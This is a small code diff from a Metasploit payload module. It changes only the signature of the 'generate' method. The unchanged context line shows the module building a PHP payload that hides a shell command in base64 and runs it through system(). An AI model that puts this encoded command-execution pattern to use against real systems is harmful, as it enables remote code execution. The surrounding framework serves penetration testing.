@@ -33,7 +33,7 @@ module MetasploitModule
   #
   # Constructs the payload
   #
-  def generate
+  def generate(_opts = {})
     return super + "system(base64_decode('#{Rex::Text.encode_base64(command_string)}'));"
   end
 
